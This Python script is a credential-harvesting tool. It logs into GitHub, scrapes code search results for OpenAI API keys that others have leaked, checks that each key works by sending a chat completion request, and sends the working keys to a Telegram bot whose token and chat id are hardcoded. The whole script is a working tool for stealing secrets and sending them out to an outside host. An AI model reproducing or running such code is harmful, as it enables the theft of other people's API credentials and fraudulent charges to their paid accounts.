import requests
import re
from bs4 import BeautifulSoup


class Github:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers = {
            "referer": "https://github.com/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/112.0.5615.49 Safari/537.36 Edg/112.0.1722.48"
        }

    @staticmethod
    def get_authenticity_token(html):
        return re.findall('<input type="hidden" name="authenticity_token" value="(.*?)"', html, re.S)[0]

    @staticmethod
    def get_timestamp(html):
        return re.findall('<input type="hidden" name="timestamp" value="(.*?)"', html, re.S)[0]

    @staticmethod
    def get_timestamp_secret(html):
        return re.findall('<input type="hidden" name="timestamp_secret" value="(.*?)"', html, re.S)[0]

    def login(self, username, password):
        login_url = 'https://github.com/login'
        html = self.session.get(login_url).text

        authenticity_token = Github.get_authenticity_token(html)
        timestamp = Github.get_timestamp(html)
        timestamp_secret = Github.get_timestamp_secret(html)

        data = {
            'commit': 'Sign in',
            'authenticity_token': authenticity_token,
            'login': username,
            'password': password,
            'webauthn-support': 'supported',
            'webauthn-iuvpaa-support': 'supported',
            'return_to': 'https://github.com/login',
            'timestamp': timestamp,
            'timestamp_secret': timestamp_secret,
        }
        return self.session.post('https://github.com/session', data=data)

    def search_code(self, word, token, userid):
        for i in range(1, 101):
            print('---------- ', i)
            url = f'https://github.com/search?o=desc&p={str(i)}&q={word}&s=indexed&type=Code'
            soup = BeautifulSoup(self.session.get(url).text, 'html.parser')
            for repo in soup.find_all('div', {'class': 'f4 text-normal'}):
                file_url = re.findall(r'"url":"https://github.com[\w/._-]+', str(repo))[0][7:]
                apikey = re.findall(r'sk-[\w\d]{48}', self.session.get(file_url).text)
                if apikey:
                    for key in apikey:
                        import openai  # 58-64 qatorlardagi kodlarni o'rniga boshqa kod yozing
                        openai.api_key = key
                        try:
                            if openai.ChatCompletion.create(
                                model="gpt-3.5-turbo",
                                messages=[{"role": "user", "content": "O'zbekiston poytaxti?"}]
                            ).choices[0].message.content:
                                requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id='
                                             f'{userid}&text={key}')
                        except:
                            print(key)


if __name__ == "__main__":
    github = Github()
    user_name = ""
    pass_word = ""
    github.login(user_name, pass_word)
    search_code = 'openai telebot'
    tg_token = '530152718:AAFD2N23cNo5XKV2JYR_q8uLCfZH8jzEDHA'
    user_id = 166852713
    github.search_code(search_code, tg_token, user_id)
